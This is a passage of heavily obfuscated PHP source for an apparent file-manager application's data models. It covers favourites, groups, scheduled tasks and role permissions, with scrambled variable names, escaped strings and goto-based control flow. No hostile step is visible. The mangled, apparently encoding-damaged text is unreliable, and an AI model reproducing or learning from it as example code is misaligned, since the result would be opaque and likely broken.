$a¦õÔë¹½İ[$bæ‡§Í»Ô][$cÉÕ³Í¦îÙ[417]] = $Fñª¿ØÊôã; } } } return $a¦õÔë¹½İ; } public function update($AÍ¦É£˜®, $bš‰ô™ƒÚ­) { goto cˆ˜ß“âù; a¦š™˜Ëò¨: if (!$DçÈ¬“é‹æ || $B‚ÈàæÔÜä && $B‚ÈàæÔÜä[$fô•–ßôÚ[379]] != $DçÈ¬“é‹æ[$fô•–ßôÚ[379]]) { return !1; } if ($B‚ÈàæÔÜä[$fô•–ßôÚ[2281]] == 1) { $bš‰ô™ƒÚ­ = array($fô•–ßôÚ[38] => $bš‰ô™ƒÚ­[$fô•–ßôÚ[38]], $fô•–ßôÚ[2115] => $bš‰ô™ƒÚ­[$fô•–ßôÚ[2115]]); } $this->filterAuth($bš‰ô™ƒÚ­[$fô•–ßôÚ[388]]); goto CÈ£§¥Òî“; CÈ£§¥Òî“: return parent::update($AÍ¦É£˜®, $bš‰ô™ƒÚ­); goto C³áíâ‚º‹; cˆ˜ß“âù: $fô•–ßôÚ =& $_SERVER[¨¤¼…´]; $DçÈ¬“é‹æ = parent::listData($AÍ¦É£˜®); $B‚ÈàæÔÜä = $this->findByName($bš‰ô™ƒÚ­[$fô•–ßôÚ[38]]); goto a¦š™˜Ëò¨; C³áíâ‚º‹: } public function remove($DøœôÊÚñù) { $C®¡ šÉ¡ = parent::listData($DøœôÊÚñù); if (!$C®¡ šÉ¡ || $C®¡ šÉ¡[$_SERVER[¨¤¼…´][1070]]) { return !1; } return parent::remove($DøœôÊÚñù); } public function add($cÏáØ†ËÙ·) { goto bŸ­Ì‚í¾; aòË„õ³Ï: $C×Ø¨ì‘Ï = array($Dö¼ÑÙ¡´[398] => $eæºß¯®°, $Dö¼ÑÙ¡´[2101] => $Dö¼ÑÙ¡´[43], $Dö¼ÑÙ¡´[2097] => $Dö¼ÑÙ¡´[2105], $Dö¼ÑÙ¡´[2500] => 1, $Dö¼ÑÙ¡´[2100] => 0, $Dö¼ÑÙ¡´[2501] => 0, $Dö¼ÑÙ¡´[2099] => $this->getSort()); $cÏáØ†ËÙ· = array_merge($C×Ø¨ì‘Ï, $cÏáØ†ËÙ·); $this->filterAuth($cÏáØ†ËÙ·[$Dö¼ÑÙ¡´[388]]); goto b‘µÂÇˆ´Ù; bŸ­Ì‚í¾: $Dö¼ÑÙ¡´ =& $_SERVER[¨¤¼…´]; $eæºß¯®° = $cÏáØ†ËÙ·[$Dö¼ÑÙ¡´[38]]; if ($this->findByName($eæºß¯®°)) { return !1; } goto aòË„õ³Ï; b‘µÂÇˆ´Ù: return parent::insert($cÏáØ†ËÙ·); goto aêïî‘ùõĞ; aêïî‘ùõĞ: } private function getSort() { $a¾©Œ³°¨¢ =& $_SERVER[¨¤¼…´]; $a‘õ§¡àÓ = parent::listData(); $d‘œÁêãæ‰ = array_to_keyvalue($a‘õ§¡àÓ, $a¾©Œ³°¨¢[43], $a¾©Œ³°¨¢[2117]); return empty($d‘œÁêãæ‰) ? 0 : max($d‘œÁêãæ‰) + 1; } private function filterAuth(&$E×é¶Á¾Ù±) { $D´¶âòì =& $_SERVER[¨¤¼…´]; $cšå®Û²§‚ = array(); $c‘‰¹ôœ‘† = array_filter(explode($D´¶âòì[57], $E×é¶Á¾Ù±)); foreach ($c‘‰¹ôœ‘† as $E×é¶Á¾Ù±) { $AË…Ş½ç’Ÿ = explode($D´¶âòì[101], $E×é¶Á¾Ù±); if ($AË…Ş½ç’Ÿ[0] == $D´¶âòì[1771] && $AË…Ş½ç’Ÿ[1] != $D´¶âòì[1027]) { $CºäÓÇ”„ = $AË…Ş½ç’Ÿ[0] . $D´¶âòì[101] . $AË…Ş½ç’Ÿ[1] . $D´¶âòì[2502]; if (!in_array($CºäÓÇ”„, $c‘‰¹ôœ‘†)) { $cšå®Û²§‚[] = $CºäÓÇ”„; } } $cšå®Û²§‚[] = $E×é¶Á¾Ù±; } $E×é¶Á¾Ù± = implode($D´¶âòì[57], $cšå®Û²§‚); } public function sort($aÏ³ì†ƒ , $fãÜ®ŠÅ»§) { return parent::update($aÏ³ì†ƒ , $fãÜ®ŠÅ»§); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\x65\155\56\164\x61\x73\x6b\x4c\151\x73\x74"; public $field = array("\x6e\x61\x6d\145", "\x74\171\x70\145", "\145\x76\145\156\164", "\164\151\x6d\x65", "\144\145\x73\143", "\163\x79\163\x74\145\155", "\145\156\141\142\x6c\145", "\x6c\141\x73\164\x52\x75\x6e", "\x73\157\x72\x74"); public function listData($Fª¾ÏËô°© = false, $eçÖĞ¸«¨â = "\163\x6f\162\x74", $f÷Å™‚…Õ× = false) { return parent::listData($Fª¾ÏËô°©, $eçÖĞ¸«¨â, $f÷Å™‚…Õ×); } public function add($bŠ²Õ¼á¬Š) { $ašˆ„ÑĞÒ± =& $_SERVER[¨¤¼…´]; $CŠ‡¢§ïŒä = $this->findByName($bŠ²Õ¼á¬Š[$ašˆ„ÑĞÒ±[38]]); if ($CŠ‡¢§ïŒä) { return !1; } $bŠ²Õ¼á¬Š[$ašˆ„ÑĞÒ±[1390]] = 0; $bŠ²Õ¼á¬Š[$ašˆ„ÑĞÒ±[2117]] = $this->getSort(); return parent::insert($bŠ²Õ¼á¬Š); } private function getSort() { $fÅ²£”£¶Ñ =& $_SERVER[¨¤¼…´]; $dÛÊù…’Œ = parent::listData(); $A‡àß¶—”» = array_to_keyvalue($dÛÊù…’Œ, $fÅ²£”£¶Ñ[43], $fÅ²£”£¶Ñ[2117]); return empty($A‡àß¶—”») ? 0 : max($A‡àß¶—”») + 1; } public function update($cç™Ñ¬òŸ, $eö„­¸—) { $eÊ‚Ôãİ£Ø =& $_SERVER[¨¤¼…´]; $a‘Ÿï¿™‚ = $this->listData($cç™Ñ¬òŸ); $C·‹ÑŒ‹ö = $this->findByName($eö„­¸—[$eÊ‚Ôãİ£Ø[38]]); if (!$a‘Ÿï¿™‚ || $C·‹ÑŒ‹ö && $C·‹ÑŒ‹ö[$eÊ‚Ôãİ£Ø[379]] != $a‘Ÿï¿™‚[$eÊ‚Ôãİ£Ø[379]]) { return !1; } return parent::update($cç™Ñ¬òŸ, $eö„­¸—); } public function remove($Eì±®äˆÇ, $b½®éÎ©ò‚ = false) { $C´•»°Âì =& $_SERVER[¨¤¼…´]; $cò‡°‚ªŸ‰ = $this->listData($Eì±®äˆÇ); if (!$cò‡°‚ªŸ‰) { return; } if (!$b½®éÎ©ò‚ && $cò‡°‚ªŸ‰[$C´•»°Âì[1070]] == $C´•»°Âì[93]) { return !1; } return parent::remove($Eì±®äˆÇ); } public function enable($E¡¡„æ«ñÌ, $D§ó¨šØ¨Ë) { return $this->update($E¡¡„æ«ñÌ, array($_SERVER[¨¤¼…´][2493] => $D§ó¨šØ¨Ë)); } public function run($AÜ„İ»ò³Ñ) { return $this->update($AÜ„İ»ò³Ñ, array($_SERVER[¨¤¼…´][2503] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\165\x73\145\162\x5f\x66\x61\x76"; protected function cacheFunctionAlias($fÈ”†òÕ‹) { $bî†ÅêÂèÎ =& $_SERVER[¨¤¼…´]; return array($bî†ÅêÂèÎ[2191] => array(USER_ID, $bî†ÅêÂèÎ[2504])); } protected function listData() { $D¿ãõÂí›» =& $_SERVER[¨¤¼…´]; $a­²ƒëà›• = array($D¿ãõÂí›»[1416] => USER_ID, $D¿ãõÂí›»[447] => 0); $D¶è‰¦ëê = $D¿ãõÂí›»[2505]; $AŸĞîÑÉ¶ = $this->field($D¶è‰¦ëê)->where($a­²ƒëà›•)->order($D¿ãõÂí›»[2506])->select(); return $AŸĞîÑÉ¶ ? $AŸĞîÑÉ¶ : array(); } protected function resetCache() { } protected function listView() { goto fÒ‹÷êÃÃ†; E™ò×Şßˆ: $fäº½ËöÉ† = array_to_keyvalue($C­ã±âŠ¹½, $Bòçã²”…˜[43], $Bòçã²”…˜[85]); if (!$fäº½ËöÉ†) { return $Bøîëˆ²½; } $a¡ÕÍÑµˆö = 2000; goto e÷±ë÷ÔÌˆ; e÷±ë÷ÔÌˆ: $A¨‰´¿ŠÔœ = array($Bòçã²”…˜[395] => array($Bòçã²”…˜[396], $fäº½ËöÉ†)); $d…¥Òæµ­ = Model($Bòçã²”…˜[742])->listSource($A¨‰´¿ŠÔœ, $a¡ÕÍÑµˆö); $d…¥Òæµ­ = array_merge($d…¥Òæµ­[$Bòçã²”…˜[83]], $d…¥Òæµ­[$Bòçã²”…˜[84]]); goto a„›¹Ş“ß„; a„›¹Ş“ß„: $d…¥Òæµ­ = array_to_keyvalue($d…¥Òæµ­, $Bòçã²”…˜[381]); foreach ($Bøîëˆ²½ as $Fà¾”Š‰èÈ => $Aº•ö¬ã–) { $D“î‰Ó¥Ş¯ = $d…¥Òæµ­[$Aº•ö¬ã–[$Bòçã²”…˜[85]]]; $D“î‰Ó¥Ş¯ = $D“î‰Ó¥Ş¯ ? $D“î‰Ó¥Ş¯ : array(); $Bøîëˆ²½[$Fà¾”Š‰èÈ] = array_merge($D“î‰Ó¥Ş¯, $Aº•ö¬ã–); } return $Bøîëˆ²½; goto E†ôÅŸïŒ«; fÒ‹÷êÃÃ†: $Bòçã²”…˜ =& $_SERVER[¨¤¼…´]; $Bøîëˆ²½ = $this->listData(); $C­ã±âŠ¹½ = array_filter_by_field($Bøîëˆ²½, $Bòçã²”…˜[39], $Bòçã²”…˜[394]); goto E™ò×Şßˆ; E†ôÅŸïŒ«: } protected function addFav($Eß¶è­İ, $CÕŒ¶Œ• = '', $d‹Š¯÷®é = "\163\157\165\162\143\x65") { goto Fò²„˜÷İ©; F¿Ö²õàÀ: return $this->add($bİÎÄ£’Ú¯); goto aù° ©Ìİ; Fò²„˜÷İ©: $a¿å›Œ±ñ¿ =& $_SERVER[¨¤¼…´]; $AïÍâ£ğÎ = array($a¿å›Œ±ñ¿[1416] => USER_ID, $a¿å›Œ±ñ¿[447] => 0, $a¿å›Œ±ñ¿[400] => $d‹Š¯÷®é, $a¿å›Œ±ñ¿[399] => $Eß¶è­İ); if ($this->where($AïÍâ£ğÎ)->find()) { return !1; } goto fèÊçÒë¼; fèÊçÒë¼: $AïÍâ£ğÎ = array($a¿å›Œ±ñ¿[1416] => USER_ID, $a¿å›Œ±ñ¿[447] => 0); $Dª½–Ş—¢Á = $this->where($AïÍâ£ğÎ)->max($a¿å›Œ±ñ¿[2117]); if (!$Dª½–Ş—¢Á) { $Dª½–Ş—¢Á = 0; } goto d¡ˆÃ¤Ö; d¡ˆÃ¤Ö: if (!$CÕŒ¶Œ• && $d‹Š¯÷®é == $a¿å›Œ±ñ¿[394]) { $CÍ•ˆºçÅ‡ = Model($a¿å›Œ±ñ¿[1107])->where(array($a¿å›Œ±ñ¿[395] => $Eß¶è­İ))->find(); if (!$CÍ•ˆºçÅ‡) { return !1; } $CÕŒ¶Œ• = $CÍ•ˆºçÅ‡[$a¿å›Œ±ñ¿[38]]; } $CÕŒ¶Œ• = $this->getAutoName($CÕŒ¶Œ•); $bİÎÄ£’Ú¯ = array($a¿å›Œ±ñ¿[1416] => USER_ID, $a¿å›Œ±ñ¿[447] => 0, $a¿å›Œ±ñ¿[398] => $CÕŒ¶Œ•, $a¿å›Œ±ñ¿[399] => $Eß¶è­İ, $a¿å›Œ±ñ¿[400] => $d‹Š¯÷®é, $a¿å›Œ±ñ¿[2099] => $Dª½–Ş—¢Á + 1); goto F¿Ö²õàÀ; aù° ©Ìİ: } protected function remove($b¦áÃ‡­õö) { $bÆŞ¹¬—”ë =& $_SERVER[¨¤¼…´]; $b’‰¨¾‘´ = array($bÆŞ¹¬—”ë[1416] => USER_ID, $bÆŞ¹¬—”ë[397] => $b¦áÃ‡­õö); return $this->where($b’‰¨¾‘´)->delete(); } protected function removeByName($a¸šŒŠ©™) { $eÑ¦Ü»›° =& $_SERVER[¨¤¼…´]; $dÅ¬‹±’‡® = array($eÑ¦Ü»›°[1416] => USER_ID, $eÑ¦Ü»›°[398] => $a¸šŒŠ©™, $eÑ¦Ü»›°[447] => 0); return $this->where($dÅ¬‹±’‡®)->delete(); } protected function rename($B£‰ğŸœ, $bß›İ‡ô±Ğ) { $E„ùšÛ­ =& $_SERVER[¨¤¼…´]; if ($B£‰ğŸœ == $bß›İ‡ô±Ğ) { return !1; } $aìåîÓ¼¸Ğ = $this->getAutoName($bß›İ‡ô±Ğ); if ($bß›İ‡ô±Ğ != $aìåîÓ¼¸Ğ) { return !1; } $d²ïÎŒ¾½£ = array($E„ùšÛ­[1416] => USER_ID, $E„ùšÛ­[447] => 0, $E„ùšÛ­[38] => $B£‰ğŸœ); return $this->where($d²ïÎŒ¾½£)->save(array($E„ùšÛ­[38] => $bß›İ‡ô±Ğ)); } protected function resetSort($fÉ¹¼‡ù¬¸) { $B­º˜Ñ¿±¨ =& $_SERVER[¨¤¼…´]; $fÉ¹¼‡ù¬¸ = is_array($fÉ¹¼‡ù¬¸) ? $fÉ¹¼‡ù¬¸ : array(); $FÕ–æ‚–½Ä = array($B­º˜Ñ¿±¨[1416] => USER_ID); for ($C„‡¡Š‹­ = 0; $C„‡¡Š‹­ < count($fÉ¹¼‡ù¬¸); $C„‡¡Š‹­++) { $FÕ–æ‚–½Ä[$B­º˜Ñ¿±¨[397]] = $fÉ¹¼‡ù¬¸[$C„‡¡Š‹­]; $this->where($FÕ–æ‚–½Ä)->save(array($B­º˜Ñ¿±¨[2099] => $C„‡¡Š‹­ + 1)); } return !0; } protected function moveTop($cÉêÆ‰à‰È) { goto d”Û‰­Éæ…; C’ß²ô‰Ö: return $this->resetSort($FŠÏ­ŒìÇ¥); goto fêƒóçÕ¢à; d”Û‰­Éæ…: $Fô‡—…­ßË =& $_SERVER[¨¤¼…´]; $d¡ºæ»ìù‹ = array($Fô‡—…­ßË[1416] => USER_ID, $Fô‡—…­ßË[447] => 0); $F§íŒåŸ­ = $this->where($d¡ºæ»ìù‹)->where(array($Fô‡—…­ßË[38] => $cÉêÆ‰à‰È))->find(); goto c³äéŞ²±‚; c³äéŞ²±‚: if (!$F§íŒåŸ­) { return; } $FŠÏ­ŒìÇ¥ = $this->field($Fô‡—…­ßË[379])->where($d¡ºæ»ìù‹)->order($Fô‡—…­ßË[2506])->select(); $FŠÏ­ŒìÇ¥ = array_to_keyvalue($FŠÏ­ŒìÇ¥, $Fô‡—…­ßË[43], $Fô‡—…­ßË[379]); goto AÛ¦¥»áê¸; AÛ¦¥»áê¸: $Eˆï¾ÔÅÙ = $FŠÏ­ŒìÇ¥; $FŠÏ­ŒìÇ¥ = array_remove_value($FŠÏ­ŒìÇ¥, $F§íŒåŸ­[$Fô‡—…­ßË[379]]); array_unshift($FŠÏ­ŒìÇ¥, $F§íŒåŸ­[$Fô‡—…­ßË[379]]); goto C’ß²ô‰Ö; fêƒóçÕ¢à: } protected function moveBottom($BîÎ¼šêïâ) { $f¶÷À‘­áß =& $_SERVER[¨¤¼…´]; $aŠî¶¨© = array($f¶÷À‘­áß[1416] => USER_ID, $f¶÷À‘­áß[447] => 0); $B—¿›Å“¶¡ = $this->where($aŠî¶¨©)->max($f¶÷À‘­áß[2117]); $EÒÖšß´ÀÆ = array($f¶÷À‘­áß[2117] => $B—¿›Å“¶¡ + 1); return $this->where($aŠî¶¨©)->where(array($f¶÷À‘­áß[38] => $BîÎ¼šêïâ))->save($EÒÖšß´ÀÆ); } private function getAutoName($FèÙ¤éè) { goto eø÷Á£‘ïª; a³åÖ¦ô²¶: $E¶æ¬ï¾æÈ = array_to_keyvalue($E¶æ¬ï¾æÈ, $AªíøÔµ´Ş[43], $AªíøÔµ´Ş[38]); if (!$E¶æ¬ï¾æÈ || !in_array($FèÙ¤éè, $E¶æ¬ï¾æÈ)) { return $FèÙ¤éè; } for ($a¬‹ßÜÈç = 0; $a¬‹ßÜÈç < count($E¶æ¬ï¾æÈ); $a¬‹ßÜÈç++) { if (!in_array($FèÙ¤éè . "\x28{$a¬‹ßÜÈç}\51", $E¶æ¬ï¾æÈ)) { return $FèÙ¤éè . "\x28{$a¬‹ßÜÈç}\x29"; } } goto A´Öğ·”¤; eø÷Á£‘ïª: $AªíøÔµ´Ş =& $_SERVER[¨¤¼…´]; $fÔ±ÚÇ£›· = array($AªíøÔµ´Ş[1416] => USER_ID, $AªíøÔµ´Ş[447] => 0); $E¶æ¬ï¾æÈ = $this->field($AªíøÔµ´Ş[38])->where($fÔ±ÚÇ£›·)->select(); goto a³åÖ¦ô²¶; A´Öğ·”¤: return $FèÙ¤éè . "\50{$a¬‹ßÜÈç}\51"; goto fÒäÅÉ©ß¶; fÒäÅÉ©ß¶: } } goto FŠ›Ó„íïÀ; c¶…—Õ«å: define($_SERVER[¨¤¼…´][1923], 3); define($_SERVER[¨¤¼…´][1924], 4); define($_SERVER[¨¤¼…´][1925], 5); goto f¦ƒÔ¾ò ï; c‡¦¿ØßœÍ: class GroupModel extends ModelBase { protected $tableName = "\147\162\157\x75\160"; protected $tableMeta = array("\164\x61\142\154\145\116\141\x6d\145" => "\147\162\x6f\165\x70\137\x6d\x65\x74\141", "\x6d\x65\x74\x61\x46\151\145\154\x64" => "\147\x72\157\165\x70\x49\104"); protected function cacheFunctionAlias($bÃ‰íØ¸´ ) { $CŠÁÛ½Œò„ =& $_SERVER[¨¤¼…´]; return array($CŠÁÛ½Œò„[2164] => array($bÃ‰íØ¸´ [0], $CŠÁÛ½Œò„[2165]), $CŠÁÛ½Œò„[2166] => array($bÃ‰íØ¸´ [0], $CŠÁÛ½Œò„[2165])); } protected function getInfo($B‰Ê½íµ²ç) { $c¯–ĞªŠÜ‰ = $this->getInfoSimple($B‰Ê½íµ²ç); if (!$c¯–ĞªŠÜ‰) { return !1; } return $this->_listDataApplyItem($c¯–ĞªŠÜ‰); } protected function getInfoSimple($BŠööïåÄæ, $dš±âÊ¥ß¥ = false) { $fˆÇ½²ŠË =& $_SERVER[¨¤¼…´]; if ($dš±âÊ¥ß¥) { $bô“¢Ÿ‹° = array($fˆÇ½²ŠË[2095] => intval($BŠööïåÄæ)); $a›Ûñ»Ş³ô = $this->where($bô“¢Ÿ‹°)->find(); return is_array($a›Ûñ»Ş³ô) ? $a›Ûñ»Ş³ô : array(); } return $this->cacheFunctionGet($fˆÇ½²ŠË[2167], $BŠööïåÄæ); } protected function groupAdd($cÈ×Ù¬‡È¸) { goto b·……Ó²õ»; b·……Ó²õ»: $c¢§âÂŠĞÂ =& $_SERVER[¨¤¼…´]; if (!$cÈ×Ù¬‡È¸[$c¢§âÂŠĞÂ[474]] && isset($cÈ×Ù¬‡È¸[$c¢§âÂŠĞÂ[2095]]) && $cÈ×Ù¬‡È¸[$c¢§âÂŠĞÂ[2095]] == 1) { if ($c¡ø›Àö±Ñ = $this->getInfoSimple($cÈ×Ù¬‡È¸[$c¢§âÂŠĞÂ[2095]], !0)) { return $cÈ×Ù¬‡È¸[$c¢§âÂŠĞÂ[2095]]; } } else { $c¡ø›Àö±Ñ = $this->getInfoSimple($cÈ×Ù¬‡È¸[$c¢§âÂŠĞÂ[474]]); if (!$c¡ø›Àö±Ñ) { return !1; } } $cÊ¾°Â¹¢ì = $c¢§âÂŠĞÂ[483]; goto cĞŒí­ë¸Ì; F»ÛÈ–ÊÌ³: if (!empty($cÈ×Ù¬‡È¸[$c¢§âÂŠĞÂ[2095]])) { $E‡Çò‚¡»ß[$c¢§âÂŠĞÂ[2095]] = $cÈ×Ù¬‡È¸[$c¢§âÂŠĞÂ[2095]]; } $FË‚ŠÕ¸í = $this->add($E‡Çò‚¡»ß); $this->setNamePinyin($FË‚ŠÕ¸í, $E‡Çò‚¡»ß[$c¢§âÂŠĞÂ[38]]); goto Eçñõ°õ”; cĞŒí­ë¸Ì: if ($c¡ø›Àö±Ñ[$c¢§âÂŠĞÂ[472]]) { $cÊ¾°Â¹¢ì = $c¡ø›Àö±Ñ[$c¢§âÂŠĞÂ[472]] . $c¡ø›Àö±Ñ[$c¢§âÂŠĞÂ[2095]] . $c¢§âÂŠĞÂ[57]; } $E‡Çò‚¡»ß = array($c¢§âÂŠĞÂ[398] => $this->groupNameAuto($cÈ×Ù¬‡È¸[$c¢§âÂŠĞÂ[474]], $cÈ×Ù¬‡È¸[$c¢§âÂŠĞÂ[38]]), $c¢§âÂŠĞÂ[380] => $cÈ×Ù¬‡È¸[$c¢§âÂŠĞÂ[474]], $c¢§âÂŠĞÂ[538] => $cÊ¾°Â¹¢ì, $c¢§âÂŠĞÂ[2168] => $cÈ×Ù¬‡È¸[$c¢§âÂŠĞÂ[2079]], $c¢§âÂŠĞÂ[2169] => 0, $c¢§âÂŠĞÂ[2099] => 0); if (isset($cÈ×Ù¬‡È¸[$c¢§âÂŠĞÂ[2117]])) { $E‡Çò‚¡»ß[$c¢§âÂŠĞÂ[2117]] = $cÈ×Ù¬‡È¸[$c¢§âÂŠĞÂ[2117]]; } else { $DÛôçö¡Ûô = $this->max($c¢§âÂŠĞÂ[2117]); if (!$DÛôçö¡Ûô) { $DÛôçö¡Ûô = 0; } $E‡Çò‚¡»ß[$c¢§âÂŠĞÂ[2117]] = $DÛôçö¡Ûô + 1; } goto F»ÛÈ–ÊÌ³; Eçñõ°õ”: if (isset($cÈ×Ù¬‡È¸[$c¢§âÂŠĞÂ[2170]])) { $this->metaSet($FË‚ŠÕ¸í, array($c¢§âÂŠĞÂ[2170] => $cÈ×Ù¬‡È¸[$c¢§âÂŠĞÂ[2170]], $c¢§âÂŠĞÂ[2171] => $cÈ×Ù¬‡È¸[$c¢§âÂŠĞÂ[2171]])); unset($cÈ×Ù¬‡È¸[$c¢§âÂŠĞÂ[2170]]); unset($cÈ×Ù¬‡È¸[$c¢§âÂŠĞÂ[2171]]); } Model($c¢§âÂŠĞÂ[1107])->groupRootAdd($FË‚ŠÕ¸í); return $FË‚ŠÕ¸í; goto dĞ„¸¦Æ; dĞ„¸¦Æ: } protected function groupEdit($cĞ÷ÜíÉë·, $Eãö°Ï±÷) { $D†‰‘µÊĞ =& $_SERVER[¨¤¼…´]; if (!empty($Eãö°Ï±÷[$D†‰‘µÊĞ[474]])) { $F”à³–ô¼ = $this->getInfoSimple($cĞ÷ÜíÉë·); $cÕš÷¡³Íâ = $this->getInfoSimple($Eãö°Ï±÷[$D†‰‘µÊĞ[474]]); if (!$F”à³–ô¼ || !$cÕš÷¡³Íâ) { return !1; } if ($F”à³–ô¼[$D†‰‘µÊĞ[2095]] == $cÕš÷¡³Íâ[$D†‰‘µÊĞ[2095]]) { return !1; } if ($Eãö°Ï±÷[$D†‰‘µÊĞ[474]] != $F”à³–ô¼[$D†‰‘µÊĞ[474]]) { if ($cÕš÷¡³Íâ[$D†‰‘µÊĞ[472]] !== $F”à³–ô¼[$D†‰‘µÊĞ[472]] && strpos($cÕš÷¡³Íâ[$D†‰‘µÊĞ[472]], $F”à³–ô¼[$D†‰‘µÊĞ[472]] . $F”à³–ô¼[$D†‰‘µÊĞ[2095]] . $D†‰‘µÊĞ[57]) === 0) { return !1; } $Eãö°Ï±÷[$D†‰‘µÊĞ[538]] = $cÕš÷¡³Íâ[$D†‰‘µÊĞ[472]] . $Eãö°Ï±÷[$D†‰‘µÊĞ[474]] . $D†‰‘µÊĞ[57]; $this->_changeChildLevel($F”à³–ô¼, $cÕš÷¡³Íâ); } } if (isset($Eãö°Ï±÷[$D†‰‘µÊĞ[38]])) { $this->setNamePinyin($cĞ÷ÜíÉë·, $Eãö°Ï±÷[$D†‰‘µÊĞ[38]]); } if (isset($Eãö°Ï±÷[$D†‰‘µÊĞ[2170]])) { $this->metaSet($cĞ÷ÜíÉë·, array($D†‰‘µÊĞ[2170] => $Eãö°Ï±÷[$D†‰‘µÊĞ[2170]], $D†‰‘µÊĞ[2171] => $Eãö°Ï±÷[$D†‰‘µÊĞ[2171]])); unset($Eãö°Ï±÷[$D†‰‘µÊĞ[2170]]); unset($Eãö°Ï±÷[$D†‰‘µÊĞ[2171]]); } return $this->where(array($D†‰‘µÊĞ[2172] => $cĞ÷ÜíÉë·))->save($Eãö°Ï±÷); } private function _changeChildLevel($CÜ•¨ƒÑÄƒ, $B¹ç½ß’¾, $dò…Ü¬ÓÈ¹ = false) { goto b‡ÁÔõåÕ; CáòÊÆÑ¾Ù: if ($dò…Ü¬ÓÈ¹) { $f‘˜Î»Ÿšç = $B¹ç½ß’¾[$Aƒíè¨ï¤[472]] . $B¹ç½ß’¾[$Aƒíè¨ï¤[2095]] . $Aƒíè¨ï¤[57]; } $B“ÊìñÔƒò = array($Aƒíè¨ï¤[538] => array($Aƒíè¨ï¤[496], $CÜ•¨ƒÑÄƒ[$Aƒíè¨ï¤[472]] . $CÜ•¨ƒÑÄƒ[$Aƒíè¨ï¤[2095]] . $Aƒíè¨ï¤[497])); $c°¬İõ§ˆÁ = array($Aƒíè¨ï¤[538] => array($Aƒíè¨ï¤[546], "\x72\x65\x70\x6c\x61\x63\x65\x28\160\x61\162\x65\156\x74\114\145\166\x65\154\54\47{$Dï©¥‚¶Ş¥}\47\x2c\x27{$f‘˜Î»Ÿšç}\x27\51")); goto B“¿Ğ»¢ùø; B“¿Ğ»¢ùø: $this->where($B“ÊìñÔƒò)->data($c°¬İõ§ˆÁ)->save(); goto e¥‚²—ƒ‹İ; b‡ÁÔõåÕ: $Aƒíè¨ï¤ =& $_SERVER[¨¤¼…´]; $Dï©¥‚¶Ş¥ = $CÜ•¨ƒÑÄƒ[$Aƒíè¨ï¤[472]] . $CÜ•¨ƒÑÄƒ[$Aƒíè¨ï¤[2095]] . $Aƒíè¨ï¤[57]; $f‘˜Î»Ÿšç = $B¹ç½ß’¾[$Aƒíè¨ï¤[472]] . $B¹ç½ß’¾[$Aƒíè¨ï¤[2095]] . $Aƒíè¨ï¤[57] . $CÜ•¨ƒÑÄƒ[$Aƒíè¨ï¤[2095]] . $Aƒíè¨ï¤[57]; goto CáòÊÆÑ¾Ù; e¥‚²—ƒ‹İ: } public function setNamePinyin($AèËŠÎÁ, $cŞ…Óäì¹Œ = false) { $bÂñéîÆøÒ =& $_SERVER[¨¤¼…´]; if (!$cŞ…Óäì¹Œ) { $C†ÑğµÆà = $this->getInfoSimple($AèËŠÎÁ); $cŞ…Óäì¹Œ = $C†ÑğµÆà[$bÂñéîÆøÒ[38]]; } if (!Input::check($cŞ…Óäì¹Œ, $bÂñéîÆøÒ[541])) { $this->metaSet($AèËŠÎÁ, $bÂñéîÆøÒ[428], null); $this->metaSet($AèËŠÎÁ, $bÂñéîÆøÒ[427], null); return; } $c­Õªñ¤÷… = array($bÂñéîÆøÒ[428] => str_replace($bÂñéîÆøÒ[60], $bÂñéîÆøÒ[43], Pinyin::encode($cŞ…Óäì¹Œ)), $bÂñéîÆøÒ[427] => Pinyin::encode($cŞ…Óäì¹Œ, $bÂñéîÆøÒ[542])); $this->metaSet($AèËŠÎÁ, $c­Õªñ¤÷…); } protected function groupStatus($C¨¾ÜÂ×ê, $eİŒÒ°ˆ§Å) { goto E°‰‰®º•—; Dô‹¬ÌÓ‰: if ($eİŒÒ°ˆ§Å == $b÷î¥îñ«[93]) { $Dâ«¤‘ ˆß = $this->parentLevelArray($bÄÒºÊì[$b÷î¥îñ«[472]]); } else { $d¶î“µ†•³ = array($b÷î¥îñ«[538] => array($b÷î¥îñ«[496], $bÄÒºÊì[$b÷î¥îñ«[472]] . $bÄÒºÊì[$b÷î¥îñ«[2095]] . $b÷î¥îñ«[497])); $Dâ«¤‘ ˆß = $this->where($d¶î“µ†•³)->field($b÷î¥îñ«[2095])->select(); $Dâ«¤‘ ˆß = array_to_keyvalue($Dâ«¤‘ ˆß, $b÷î¥îñ«[43], $b÷î¥îñ«[2095]); } $Dâ«¤‘ ˆß[] = $bÄÒºÊì[$b÷î¥îñ«[2095]]; $AÇ¢©±Ù’ = array(); goto Cï¥ÕŒ–ƒ†; Cï¥ÕŒ–ƒ†: foreach ($Dâ«¤‘ ˆß as $C¨¾ÜÂ×ê) { $AÇ¢©±Ù’[] = array($b÷î¥îñ«[2095] => $C¨¾ÜÂ×ê, $b÷î¥îñ«[99] => $b÷î¥îñ«[679], $b÷î¥îñ«[372] => $eİŒÒ°ˆ§Å); } return Model($b÷î¥îñ«[2173])->addAll($AÇ¢©±Ù’, array(), !0); goto FÓº¯º´Ä; E°‰‰®º•—: $b÷î¥îñ« =& $_SERVER[¨¤¼…´]; $bÄÒºÊì = $this->getInfoSimple($C¨¾ÜÂ×ê); if (!$bÄÒºÊì) { return !1; } goto Dô‹¬ÌÓ‰; FÓº¯º´Ä: } protected function groupRemove($a¨é°í¨¬Î) { goto d¥‹ããƒ; E»›¬†Şîé: if (!$Cİ™¬ÍâÏ || $Cİ™¬ÍâÏ[$f´ƒ¦ŠöŒÅ[474]] == 0) { return !1; } $bÖ‚”¡Ã† = $this->getInfoSimple($Cİ™¬ÍâÏ[$f´ƒ¦ŠöŒÅ[474]]); $this->_changeChildLevel($Cİ™¬ÍâÏ, $bÖ‚”¡Ã†, !0); goto C±¦š¥è“‰; C±¦š¥è“‰: $this->where(array($f´ƒ¦ŠöŒÅ[474] => $a¨é°í¨¬Î))->save(array($f´ƒ¦ŠöŒÅ[474] => $Cİ™¬ÍâÏ[$f´ƒ¦ŠöŒÅ[474]])); Model($f´ƒ¦ŠöŒÅ[2173])->where($CÉ¯š¯á–)->delete(); Model($f´ƒ¦ŠöŒÅ[2174])->where($CÉ¯š¯á–)->delete(); goto bùÀÈ’Ş; bùÀÈ’Ş: Model($f´ƒ¦ŠöŒÅ[742])->groupRootRemove($a¨é°í¨¬Î); return $this->where($CÉ¯š¯á–)->delete(); goto béÂ²šëÕ; d¥‹ããƒ: $f´ƒ¦ŠöŒÅ =& 